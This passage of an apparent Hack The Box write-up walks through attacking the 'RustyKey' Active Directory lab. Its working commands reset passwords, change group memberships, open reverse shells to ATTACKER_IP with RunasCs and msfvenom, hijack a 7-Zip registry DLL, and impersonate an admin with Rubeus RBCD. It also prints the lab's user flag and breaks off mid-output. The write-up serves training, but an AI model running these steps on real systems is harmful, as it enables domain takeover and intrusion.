BloodHound shows that user `gg.anderson` is disabled and the computer account does not have permission to enable the account.
This means that only `bb.morgan` and `ee.reed` potential targets.

![](images/Pasted%20image%2020250809154922.png)

The domain allows RC4 authentication,

```
fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k get object "DC$" --attr msDS-SupportedEncryptionTypes

distinguishedName: CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
msDS-SupportedEncryptionTypes: 4
```

But the 3 Remote Management Users are indirect members of `Protected Users`, which usually wants AES256/AES128 authentication.  This conflicts with the domain encryption type and causes the authentication to fail.

![](images/Pasted%20image%2020250809143436.png)

BloodHound suggests using `net` to change the password for `ee.reed` and `bb.morgan`.

![](images/Pasted%20image%2020250809154041.png)

`bloodyAD` is used instead to change `bb.morgan` password.

```
fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k set password bb.morgan Password123!
[+] Password changed successfully!
```

But requesting a Kerberos TGT fails,

```
fcoomans@kali:~/htb/rustykey$ impacket-getTGT 'rustykey.htb/bb.morgan:Password123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
```

 Due to the `IT` groups nested membership to `Protected Users`.

![](images/Pasted%20image%2020250809153904.png)

Luckily `HelpDesk` has `AddMember` rights to the `Protected Objects` group, which `IT` is a member of.  This right not only allows adding members, but removing them as well!

![](images/Pasted%20image%2020250809175603.png)

`bloodyAD` confirms this and shows that `WRITE` permission is indeed available on `Protected Objects`.

```
fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k get writable

distinguishedName: CN=TPM Devices,DC=rustykey,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=rustykey,DC=htb
permission: WRITE

distinguishedName: CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=Protected Objects,CN=Users,DC=rustykey,DC=htb
permission: WRITE

distinguishedName: CN=dd.ali,OU=Users,OU=Finance,DC=rustykey,DC=htb
permission: WRITE
```

### 🧪 Exploitation

#### 🔼 PrivEsc to bb.morgan

The `IT` group is removed from the `Protected Objects` and through nested membership from the `Protected Users` group.

```
fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k get membership IT

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=rustykey,DC=htb
objectSid: S-1-5-32-580
sAMAccountName: Remote Management Users

distinguishedName: CN=Protected Users,CN=Users,DC=rustykey,DC=htb
objectSid: S-1-5-21-3316070415-896458127-4139322052-525
sAMAccountName: Protected Users

distinguishedName: CN=Protected Objects,CN=Users,DC=rustykey,DC=htb
objectSid: S-1-5-21-3316070415-896458127-4139322052-1130
sAMAccountName: Protected Objects

fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k remove groupMember "PROTECTED OBJECTS" "IT"
[-] IT removed from PROTECTED OBJECTS

fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k get membership IT

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=rustykey,DC=htb
objectSid: S-1-5-32-580
sAMAccountName: Remote Management Users
```

Authentication with `bb.morgan` now works.

```
fcoomans@kali:~/htb/rustykey$ nxc ldap dc.rustykey.htb -u bb.morgan -p Password123! -k
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\bb.morgan:Password123!
```

`impacket-getTGT` is used to request a Kerberos TGT for `bb.morgan`.  `klist` shows that the ticket is available after setting the `KRB5CCNAME` to the `bb.morgan` credential cache file that contains the TGT.

```
fcoomans@kali:~/htb/rustykey$ impacket-getTGT 'rustykey.htb/bb.morgan:Password123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in bb.morgan.ccache

fcoomans@kali:~/htb/rustykey$ export KRB5CCNAME=bb.morgan.ccache

fcoomans@kali:~/htb/rustykey$ klist
Ticket cache: FILE:bb.morgan.ccache
Default principal: bb.morgan@RUSTYKEY.HTB

Valid starting       Expires              Service principal
08/09/2025 23:54:08  08/10/2025 09:54:08  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
        renew until 08/10/2025 23:53:49
```

`evil-winrm` is used to connect to the server using the Kerberos TGT.

```
fcoomans@kali:~/htb/rustykey$ evil-winrm -i dc.rustykey.htb -r rustykey.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> whoami
rustykey\bb.morgan
```

### 💰 Post Exploitation
#### 🚩 user.txt

`bb.morgan` holds the `user.txt` flag.

```
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> tree C:\Users /a /f
Folder PATH listing
Volume serial number is 00BA-0DBE
C:\USERS
+---Administrator
+---bb.morgan
|   +---Desktop
|   |       internal.pdf
|   |       user.txt
|   |
|   +---Documents
|   +---Downloads
|   +---Favorites
|   +---Links
|   +---Music
|   +---Pictures
|   +---Saved Games
|   \---Videos
+---mm.turner
\---Public
```

```
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> type C:\Users\bb.morgan\Desktop\user.txt
17ea98fb6613c3a95e50da3436b280fd
```

## 🧩 DLL Hijacking

### 🔎 Recon

#### 📝 Internal Memo

`internal.pdf` is downloaded to the attack host using the `evil-winrm` `download` command,

```
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> download C:/Users/bb.morgan/Desktop/internal.pdf /home/fcoomans/htb/rustykey/internal.pdf

Info: Downloading C:/Users/bb.morgan/Desktop/internal.pdf to /home/fcoomans/htb/rustykey/internal.pdf

Info: Download successful!
```

And opened to reveal a wealth of interesting information!

![](images/Pasted%20image%2020250809160157.png)

It shows that the `Support` group is allowed to make changes to the archive program's Context Menu options by making changes to the Registry, due to an issue experienced on newer systems.

```
From: bb.morgan@rustykey.htb
To: support-team@rustykey.htb
Subject: Support Group - Archiving Tool Access
Date: Mon, 10 Mar 2025 14:35:18 +0100
Hey team,
As part of the new Support utilities rollout, extended access has been temporarily granted to allow
testing and troubleshooting of file archiving features across shared workstations.
This is mainly to help streamline ticket resolution related to extraction/compression issues reported
by the Finance and IT teams. Some newer systems handle context menu actions differently, so
registry-level adjustments are expected during this phase.
A few notes:
- Please avoid making unrelated changes to system components while this access is active.
- This permission change is logged and will be rolled back once the archiving utility is confirmed
stable in all environments.
- Let DevOps know if you encounter access errors or missing shell actions.
Thanks,
BB Morgan
IT Department
```

Looking at the Installed Programs shows that the archiving tool mentioned in the memo is most probably `7-Zip`.

```
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> $Installed = Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> $Installed += Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> $Installed |Select-Object DisplayName,DisplayVersion,InstallLocation |Where-Object { $_.DisplayName -ne $null } |Sort-Object -Property DisplayName -Unique |Format-Table -AutoSize

DisplayName                                                        DisplayVersion InstallLocation
-----------                                                        -------------- ---------------
7-Zip 24.09 (x64)                                                  24.09          C:\Program Files\7-Zip\
Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.40.33816 14.40.33816.0
Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.40.33816 14.40.33816.0
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.40.33816     14.40.33816
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.40.33816        14.40.33816
Microsoft Visual C++ 2022 X86 Additional Runtime - 14.40.33816     14.40.33816
Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.40.33816        14.40.33816
VMware Tools                                                       13.0.1.0       C:\Program Files\VMware\VMware Tools\
```

https://superuser.com/questions/1692977/where-in-the-registry-are-the-context-menu-options-for-7zip shows that the `HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}` registry key can be used to make changes to the Context Menu options for 7-zip.

Searching `HKCR` shows the `CLSID` entry for 7-zip in the registry key.

```
PS C:\Users\bb.morgan\Documents> reg query HKCR /s /f "7-zip"
reg query HKCR /s /f "7-zip"

HKEY_CLASSES_ROOT\*\shellex\ContextMenuHandlers\7-Zip

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll

HKEY_CLASSES_ROOT\Directory\shellex\ContextMenuHandlers\7-Zip

HKEY_CLASSES_ROOT\Directory\shellex\DragDropHandlers\7-Zip

HKEY_CLASSES_ROOT\Drive\shellex\DragDropHandlers\7-Zip

HKEY_CLASSES_ROOT\Folder\shellex\ContextMenuHandlers\7-Zip

HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{23170F69-40C1-278A-1000-000100020000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip32.dll

End of search: 9 match(es) found.
```

The only `Support` user is `ee.reed`, but `Support` is a member of `Protected Objects`.  `Support` can be removed from the `Protected Objects` groups by using the `IT-Computer3`.

![](images/Pasted%20image%2020250812090530.png)

If `ee.reed` can modify the registry key, then I can change the path to the context menu DLL to a malicious DLL, effectively hijacking the DLL.

### 🧪 Exploitation

#### 🔼 PrivEsc to ee.reed

The automated script on the server periodically removes the `IT-Computer3` account from the `HelpDesk` group.  I re-add it as a member and change `ee.reed` password.

```
fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k add groupMember HELPDESK IT-Computer3$
[+] IT-Computer3$ added to HELPDESK

fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k set password ee.reed Password123!
[+] Password changed successfully!
```

The `IT-Computer3$` account is once again used to this time remove the `Support` group from the `Protected Objects` group.

```
fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k get membership Support

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=rustykey,DC=htb
objectSid: S-1-5-32-580
sAMAccountName: Remote Management Users

distinguishedName: CN=Protected Users,CN=Users,DC=rustykey,DC=htb
objectSid: S-1-5-21-3316070415-896458127-4139322052-525
sAMAccountName: Protected Users

distinguishedName: CN=Protected Objects,CN=Users,DC=rustykey,DC=htb
objectSid: S-1-5-21-3316070415-896458127-4139322052-1130
sAMAccountName: Protected Objects

fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k remove groupMember "PROTECTED OBJECTS" "Support"
[-] Support removed from PROTECTED OBJECTS

fcoomans@kali:~/htb/rustykey$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u IT-Computer3$ -p Rusty88! -k get membership Support

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=rustykey,DC=htb
objectSid: S-1-5-32-580
sAMAccountName: Remote Management Users
```

I upload `RunasCs.exe` to the target, since I still have remote access as `bb.morgan`.

```
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> upload RunasCs.exe

Info: Uploading /home/fcoomans/htb/rustykey/RunasCs.exe to C:\Users\bb.morgan\Documents\RunasCs.exe

Data: 68948 bytes of 68948 bytes copied

Info: Upload successful!
```

A `nc` listener is started on the attack host,

```
fcoomans@kali:~/htb/rustykey$ rlwrap nc -lvnp 4445
listening on [any] 4445 ...
```

And `RunasCs.exe` is used to launch a reverse shell for user `ee.reed`.

```
C:\Users\bb.morgan\Documents>RunasCs.exe ee.reed Password123! powershell.exe -r ATTACKER_IP:4445
RunasCs.exe ee.reed Password123! powershell.exe -r ATTACKER_IP:4445
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-1729d612$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 25052 created in background.
```

The `nc` listener catches the reverse shell.

```
fcoomans@kali:~/htb/rustykey$ rlwrap nc -lvnp 4445
listening on [any] 4445 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.75] 60834
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
rustykey\ee.reed
```

#### 🗜️ 7-zip

The successful creation of a registry entry under the `7-Zip` context menu registry key confirms that `ee.reed` can indeed modify the registry entries for 7-zip.

```
PS C:\Windows\system32> reg add "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\Test" /ve /t REG_SZ /d "Test" /f
reg add "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\Test" /ve /t REG_SZ /d "Test" /f
The operation completed successfully.
PS C:\Windows\system32> reg delete "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\Test"
reg delete "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\Test"
Permanently delete the registry key HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\Test (Yes/No)? y
The operation completed successfully.
```

I use `msfvenom` to create a malicious reverse shell DLL file and share it using a Python web server.

```
fcoomans@kali:~/htb/rustykey$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f dll -o www/revshell.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: www/revshell.dll

fcoomans@kali:~/htb/rustykey$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

The malicious DLL is downloaded to the target.

```
PS C:\tools> iwr http://ATTACKER_IP:8000/revshell.dll -outfile revshell.dll
iwr http://ATTACKER_IP:8000/revshell.dll -outfile revshell.dll
```

Another `nc` listener is started on the attack host.

```
fcoomans@kali:~/htb/rustykey$ rlwrap nc -lvnp 4446
listening on [any] 4446 ...
```

And the registry entry is modified to point to the malicious DLL.

```
PS C:\tools> reg add "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /t REG_SZ /d "C:\tools\revshell.dll" /f
reg add "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /t REG_SZ /d "C:\tools\revshell.dll" /f
The operation completed successfully.
```

### 💰 Post Exploitation
#### 🔼 PrivEsc to mm.turner

The `nc` listener catches the reverse shell for user `mm.turner`.

```
fcoomans@kali:~/htb/rustykey$ rlwrap nc -lvnp 4446
listening on [any] 4446 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.75] 60886
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows>whoami
whoami
rustykey\mm.turner
```

## 🎭 Impersonating an admin using RBCD

### 🔎 Recon

BloodHound shows that the `mm.turner` can impersonate a user by using Resource-based constrained through a computer that is under `mm.turner` control.

![](images/Pasted%20image%2020250810154623.png)

![](images/Pasted%20image%2020250810154656.png)

BloodHound shows that there are two Administrators.  I tried to impersonate Administrator, but this didn't work.  The target account to use is, therefore, `BACKUPADMIN`.

![](images/Pasted%20image%2020250812092424.png)

`mm.turner` also cannot add a new computer to the domain, but I already control `IT-Computer3`.  This will do nicely!

### 🧪 Exploitation

#### 🔼 PrivEsc to BACKUPADMIN

A Python web server is started to share `Rubeus.exe` and `PowerView.ps1`.

```
fcoomans@kali:~/htb/rustykey$ cp /usr/share/windows-resources/rubeus/Rubeus.exe www

fcoomans@kali:~/htb/rustykey$ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 www

fcoomans@kali:~/htb/rustykey$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Both tools are downloaded to the target.

```
PS C:\Tools> iwr http://ATTACKER_IP:8000/Rubeus.exe -outfile Rubeus.exe
iwr http://ATTACKER_IP:8000/Rubeus.exe -outfile Rubeus.exe

PS C:\Tools> iwr http://ATTACKER_IP:8000/PowerView.ps1 -outfile PowerView.ps1
iwr http://ATTACKER_IP:8000/PowerView.ps1 -outfile PowerView.ps1
```

`PowerView` is imported.

```
PS C:\Tools> Import-Module .\PowerView.ps1
Import-Module .\PowerView.ps1
```

The `AddAllowedToAct` permission to `DC$` allowed me to modify the `PrincipalsAllowedToDelegateToAccount` attribute on `DC$`, effectively enabling Resource-Based Constrained Delegation from the `IT-Computer3$` to the domain controller.
This command tells `DC$` that `IT-Computer3$` is now trusted to impersonate users to `DC$`.

```
PS C:\Tools> Set-ADComputer -Identity "DC$" -PrincipalsAllowedToDelegateToAccount "IT-Computer3$"
Set-ADComputer -Identity "DC$" -PrincipalsAllowedToDelegateToAccount "IT-Computer3$"
```

`PowerView` is used to get the SID for `IT-Computer3`, as shown in BloodHound.   This step could strictly speaking be skipped as I already knew the SID from BloodHound, but I decided to add it here for completion.

```
PS C:\Tools> $ComputerSid = Get-DomainComputer it-computer3 -Properties objectsid |select -expand objectsid
$ComputerSid = Get-DomainComputer it-computer3 -Properties objectsid |select -expand objectsid
PS C:\Tools> $ComputerSid
$ComputerSid
S-1-5-21-3316070415-896458127-4139322052-1125
```

The Security Descriptor is created, once again as per the BloodHound instructions.

```
PS C:\Tools> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
PS C:\Tools> $SDBytes = New-Object byte[] ($SD.BinaryLength)
$SDBytes = New-Object byte[] ($SD.BinaryLength)
PS C:\Tools> $SD.GetBinaryForm($SDBytes, 0)
$SD.GetBinaryForm($SDBytes, 0)
```

And set the SD on `DC`.

```
PS C:\Tools> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

`Rubeus` is used to get the RC4 hash for `Rusty88!` (the password for `IT-Computer3`).

```
PS C:\Tools> .\Rubeus.exe hash /password:Rusty88!
.\Rubeus.exe hash /password:Rusty88!

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Calculate Password Hash(es)

[*] Input password             : Rusty88!
[*]       rc4_hmac             : B52B582F02F8C0CD6320CD5EAB36D9C6

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
```

`Rubeus` is then used to impersonate `Administrator`, which fails:

```
PS C:\Tools> .\Rubeus.exe s4u /user:it-computer3$ /rc4:B52B582F02F8C0CD6320CD5EAB36D9C6 /impersonateuser:Administrator /msdsspn:cifs/DC.rustykey.htb /ptt /nowrap
.\Rubeus.exe s4u /user:it-computer3$ /rc4:B52B582F02F8C0CD6320CD5EAB36D9C6 /impersonateuser:Administrator /msdsspn:cifs/DC.rustykey.htb /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: S4U

[*] Using rc4_hmac hash: B52B582F02F8C0CD6320CD5EAB36D9C6
[*] Building AS-REQ (w/ preauth) for: 'rustykey.htb\it-computer3$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFmDCCBZSgAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoQ4bDFJVU1RZS0VZLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMcnVzdHlrZXkuaHRio4IEYDCCBFygAwIBF6EDAgECooIETgSCBEpluAiUg3/0zoLDu66do05xm7GZyB6Z45Ku1OJc2NykhPn8Ky+eV+IvOqFdfM0kberXwMhwdxEhGnt/pi7XqnLHGhCwHJB9/1oE96f6218jxl3rVwmvG55qoRcaWNToxGpoZPIy3paf8KdD+SXP/6imtl+CdsCFAhVDfzkc2g3+D4TSWp2ReYgKsEvy1UaPggzx5T3S+wQXRB/pWKQ8hK6Un8PoQziUN7ZutBPgaUEd/PPZCLj3eMfZi+kV2IxXevcnt3wXboI5votsriAVFQMNNGOlmdXwRUQB+DoNVS1kkt07ianuDvunXTtan4lsaMciUSUldVFJhHg2C8SuvVU0jBFaykM0YKYRqd+hv6tfGQCOI6Zrkd/R9F3TojKzK3tl5u3BS12i+Tr8QknqIvFStSfYd/QTP8TL8c/D4qBasE7XPsxwdk9rZH9qnxU21FcMkYya39qVQ8SD81ZEG5ylnxD+E2fKnbuq7YV7mkaQK4DP1TnOpt+15Pp2C3rqCVFSMSac8wWqUYDsG5jVKSyLoW3ipnM7QextLDeuUCXj7MVF6ETJWDwiwLirPhB5Zpc8Onxzw00aisao6T+qHkifVZoufcPhK1Kkkb13U9/ojh99PzTEVDbe6F5DgbbC7iVBBwvITdrBAle2i0XLDaipUqaZhD/c8RZ759TjiINJJAjwivLnoPvdFQVVFBf5KbyFEMaB65c2XtpA+YiR2ISCooVN/T636naT95fyGHCghlvA/0RhWk3tri3yqJ2OE1WTF3I6OccKgvvItI2ieHmLo4MYNzn+f6yWfKuE9kg1YxjjsVYkg4VzjgPdaAhtZsSkSyT7wKQ+e9p7+u2palyuGVe/dL6QizAHegiVa2PlqDRDX2UpWuAsCI/7nsoZi3EkOIbIL9PdPilSSPPQb2fil4dhK4y6MemopHUffb+Wct0GNVBVhf3MtPohCjTFS+xAS92ZkfQRc2mKxTgw0B0l1GDeBvIMopzIl2G4wMJVS9f/dxRPc+xvMqNgexUFKNkGTUKaVNzLdO0cdXWqKFr46/TK0c1XJGQg9KD79vK7zIQKi5ylVVdJjnw/bheyhiCbgtY1tcsJ15TjrywfburvY5KpxUTLbFwdkXxJEzGcUfsapochrcw4nzdA5HsLBIFc6nJXhOnepsQDS1KDgKCop4RaKCNsgkwP5mVmXSTTk8NmH8fIitO4+IEkxLhaNtPzVmXwS+83Z0cpPimsFwR5It6BCAIBW+dl4kJrKV+JgyhOJShUGEY0MOTeR9RKMFNbuXY+efHT8dLTXazVtqlCwlVEQ/bQBTVvD/Ct52aVkGe7ZLdlktCZKv9UDHWIRKi/uUZ8bmvFEAXqfg7KEvmibfpLoedZyYZ6Sh7mRTKvQq+MwzmY1nCDFFlyep2OcNfwuwgkdoV5UyP+1W8MBjTjSz8U3NN2MyWLwol11Nw8k98r54/4QZjoy3yjgdswgdigAwIBAKKB0ASBzX2ByjCBx6CBxDCBwTCBvqAbMBmgAwIBF6ESBBCo52SFFDalMCtDC6nwMv7MoQ4bDFJVU1RZS0VZLkhUQqIaMBigAwIBAaERMA8bDWl0LWNvbXB1dGVyMySjBwMFAEDhAAClERgPMjAyNTA4MTAyMjA4MzFaphEYDzIwMjUwODExMDgwODMxWqcRGA8yMDI1MDgxNzIyMDgzMVqoDhsMUlVTVFlLRVkuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxydXN0eWtleS5odGI=


[*] Action: S4U

[*] Using domain controller: dc.rustykey.htb (fe80::a64c:ba44:ce1c:8f65%11)
[*] Building S4U2self request for: 'it-computer3$@RUSTYKEY.HTB'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'it-computer3$@RUSTYKEY.HTB'
[*] base64(ticket.kirbi):

      doIF0jCCBc6gAwIBBaEDAgEWooIE6TCCBOVhggThMIIE3aADAgEFoQ4bDFJVU1RZS0VZLkhUQqIaMBigAwIBAaERMA8bDWl0LWNvbXB1dGVyMySjggSoMIIEpKADAgEXoQMCAQSiggSWBIIEkppT5PkWadttJ6EWOtsPIJl8Ow2D/0aPIZlo8fmRYeLWhnNakaKGevNxnj/krMn3phNs4Fv8mtO6xHHoTLJqp1Kz6XmL0t/8UGFc44Z8dJpXQuIfDFJSVJm/UNXlehuBtvGzLRaramAWtV30sMVLcBTIuMByYD2QG1CxeD1Uvjc1jlElqnWARCLqDJ1uMFwuJKxMaQtaTMjECJE3ZNgn1cZbenud6zITjpYk7WOGxNev3quNkhO/56rJWzLRw7NTBjfiRnHZZRkb6LxxqCNXfqcaZkz4fAdebt9qnlkUfnBWOwMc9mQ2M0Oj5vR0gUVY9yi5cktaNq/T8s+6fE6EbGep88QQ5OzDFQFxh3y4GUT2BwcTfXdKYesMYXhS8YjSAO+wKkQ7xlwpl23UwdvQIwvHnPcfPtPxLTgn1vavPmdzuLWfPh9k9Zj/CSmcsoiIPoKAgDxkXenX6s7jkDvSHrPeuZgtQ4HsStUKnwQWLaBohaSRqfhHM4Y1+lHfA3RIy2F08vKy2iZjcfOQM2CJCk6IAf/2IE5/IryKnIP6grgXKiGsuE5LDToVbWEDOgruxFiDP8eqw3Skes8G9YMKGmO3yVphqbEHnDa3avq1d89rzlGYZboOKgf4UEdjDMiS9afcdy31o72cgRMloPvOPRDmeWJC6A7OVLzUAyNYJM7r59aULfuHFoJHE/EPkb18fIV48P5q3ffWeacas0+z4rlChQsnrpeLwQjhsrL4d296a2j2XQTHGMI0S9lrdfFRyFOxorvEy/Tb3iNJGcXbmXBNKKEU340qwhXzJcRzgollcftwn3ZNKrcRKtfH2FL/rdNfaF8KJLy6hPilO7joA63O/iAIe+2dzsL0W/GHPdJT9vu5nWftw4iA/iMQg24hti+qwtAG6pQgN2ndr5ezEhf7+uXWzPoxL9uuZndXrLHV0+pPhi5q1reG1SVCZj6FWVSyUSRUomzVxVtfWk4xIVTMYB72itVxqDpBeQT6PUl75+YaRDI2eQOZYQknp8zY20fzncmPnbE6UKv+H7B/rtg+gowZnCCXjuKDOAvGVTeBodwBthGrUd9kc7Mfa+PKNc1AZRkcH7iCAJw3Rj4wBmg2irxUsXMCUsnVhGIv30RTUECQwRGlHTra5EC4DStyaP5Jh2pSzDc0FInNZuk38rgh5lK3lseSsvijWskcyhas10MoPjiwhaMrzYdn+/FwfWW39MKtSTtRNDqLUZC4zZgw9MMSjdAwNpilFc91zz+q7Tv5k6xD4897wGjs/7EQQ65hw27bm9dm67WNppJOXXWb8xNlZ/kXxWk2TYJXEbE5gX8GjaM1iiINHGYe9saalgsiwZXumOtpKQWpEC8KFIyDf1hH87rDKPqfgQmkfjPlHfNsbNJcYHFdP0vmPQn1pMtDC0sGyLC/+fts6JTQB9UFWQNtsEmmbHMZLTz6+JMKdKAB/Wa3JcfigcOBSANzgu74/XG5+4XqMh7gWtwtR191S81jllBXCVMnWVZ8Xp7Vr3fOSthMikLQeiYD8eRLbOuSIwyPyARMS/rklWcR8u94dKOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEEPSXBPpc8xZ1qpZWauj6T3OhDhsMUlVTVFlLRVkuSFRCohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAAKEAAKURGA8yMDI1MDgxMDIyMDgzMVqmERgPMjAyNTA4MTEwODA4MzFapxEYDzIwMjUwODE3MjIwODMxWqgOGwxSVVNUWUtFWS5IVEKpGjAYoAMCAQGhETAPGw1pdC1jb21wdXRlcjMk

[*] Impersonating user 'Administrator' to target SPN 'cifs/DC.rustykey.htb'
[*] Using domain controller: dc.rustykey.htb (fe80::a64c:ba44:ce1c:8f65%11)
[*] Building S4U2proxy request for service: 'cifs/DC.rustykey.htb'
[*] Sending S4U2proxy request

[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
```

Impersonating `BACKUPADMIN` is successful, however!

```
PS C:\Tools> .\Rubeus.exe s4u /user:it-computer3$ /rc4:B52B582F02F8C0CD6320CD5EAB36D9C6 /impersonateuser:BACKUPADMIN /msdsspn:cifs/dc.rustykey.htb /ptt /nowrap
.\Rubeus.exe s4u /user:it-computer3$ /rc4:B52B582F02F8C0CD6320CD5EAB36D9C6 /impersonateuser:BACKUPADMIN /msdsspn:cifs/dc.rustykey.htb /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: S4U

